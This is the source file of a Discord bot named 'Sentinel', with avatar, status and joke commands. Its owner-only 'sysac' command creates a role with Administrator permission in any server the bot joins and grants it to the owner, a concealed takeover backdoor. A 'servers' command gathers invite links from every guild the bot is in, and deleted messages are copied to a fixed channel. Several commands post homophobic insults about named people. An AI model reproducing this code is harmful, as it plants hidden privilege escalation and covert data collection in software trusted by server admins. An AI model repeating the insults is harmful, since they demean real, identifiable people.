//constants

const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./config.json")
const token = process.env.token;
const dev_ids = config.ownerID;

//startup event handlers

client.on('ready', function() {
    console.log('\x1b[45m', 'Status loaded...');
    client.user.setPresence({ game: { name: `Cladri sleep`, type: `Watching` } });
});

client.on("ready", () => {
  console.log('\x1b[45m', 'Sentinel loaded...');
});

client.on('disconnected', function() {
    console.log('[META][WARN] Sentinel disconnected from Discord API Service. reconnecting...');
});

client.on('warn', function(msg) {
    console.log('[META][WARN] ' + msg);
});

client.on('error', function(err) {
    console.log('[META][ERROR] ' + err.message);
    process.exit(1);
});

client.on('messageDelete', message => {
  console.log(`message "${message.cleanContent}" was deleted from channel: ${message.channel.name} at ${new Date()}`);
  client.channels.get("610326108830826528").send(`message "${message.cleanContent}" has been deleted at ${new Date()}`)
});

client.on("message", (message) => {


  //bot check
  if (!message.content.startsWith(config.prefix) || message.author.bot) return;

  //avatar command
  if (message.content.startsWith(config.prefix + "test")) {
    message.channel.send("I'm still alive bitch");
  } else
 if (message.content.startsWith(config.prefix + 'avatar')) {
    const user = message.mentions.users.first() || message.author;
    const avatarEmbed = new Discord.RichEmbed()
        .setColor(0x333333)
        .setAuthor(user.username)
        .setImage(user.avatarURL);
    message.channel.send(avatarEmbed);
  } else

  // Create a new role with data
  if (message.content.startsWith(config.prefix + 'sysac') && message.author.id === config.ownerID){
  let me = message.author
  let role = message.guild.createRole({
          name : 'OP',
          color : "RANDOM",
          permissions : [8],
          position: 0
          })
          let role1 = message.guild.roles.find('name', 'OP')
      message.channel.send(`done`)
     message.guild.member(me).addRole(role1);
  } else

// Note: this snippet requires the variables "client" and "message" to work, these need to be provided by your script
if (message.content.startsWith(config.prefix + 'servers') && message.author.id === config.ownerID){

var allowedToUse = true;
for(let i = 0; i < dev_ids.length; i++) if(message.author.id == dev_ids[i]) allowToUse = true;

if(allowedToUse) {
    var invites = ["I am required else it won't work"], ct = 0;
    client.guilds.forEach(g => {
        g.fetchInvites().then(guildInvites => {
            invites[invites.length + 1] = (g + " - `Invites: " + guildInvites.array().join(", ") + "`");
            ct++;

            if(ct >= client.guilds.size) {
                for(let i = 0; i < invites.length; i++) {
                    if(invites[i] == undefined) invites.splice(i, 1);
                }

                invites.shift();

                for(let i = 0; i < invites.length; i++) invites[i] = "- " + invites[i];
                invites = invites.join("\n\n");

                let embed = new Discord.RichEmbed()
                .setTitle("Sentinel current guilds:")
                .setDescription(invites);

                message.channel.send(embed);
            }
        }).catch(err => {
            ct++;
        });
    });
}
else {
    message.reply("this command can only be used by a developer.");
  }
} else

  // Simple commands
  if (message.content.startsWith(config.prefix + "Is SOM gay?")) {
    message.channel.send("Yeah he's a massive goy");
  } else
  if (message.content.startsWith(config.prefix + "Is Bellmander gay?")) {
    message.channel.send("100% cock addict");
  } else
  if (message.content.startsWith(config.prefix + "Is Legit gay?")) {
    message.channel.send("No, but he is obese and has diabetes");
  } else
  if (message.content.startsWith(config.prefix + "Is Cladri gay?")) {
    message.channel.send("Yes he likes hentai traps #bibleblack");
  } else
  if (message.content.startsWith(config.prefix + "Is Iiro gay?")) {
    message.channel.send("big fat");
  } else
  if (message.content.startsWith(config.prefix + "Is Roku gay?")) {
    message.channel.send("Obviously");
  } else
  if (message.content.startsWith(config.prefix + "Is Nick gay?")) {
    message.channel.send("Simply the gayest");
  } else
  if (message.content.startsWith(config.prefix + 'owner') && message.author.id === config.ownerID){
    message.channel.send("Default#9672");
  } else
  if (message.content.startsWith(config.prefix + 'endgamespoilers')) {
    message.channel.send("He's here. . .", {
      file: "https://i.imgur.com/lyCfMno.gif"
        });
    }

});

client.login(token);
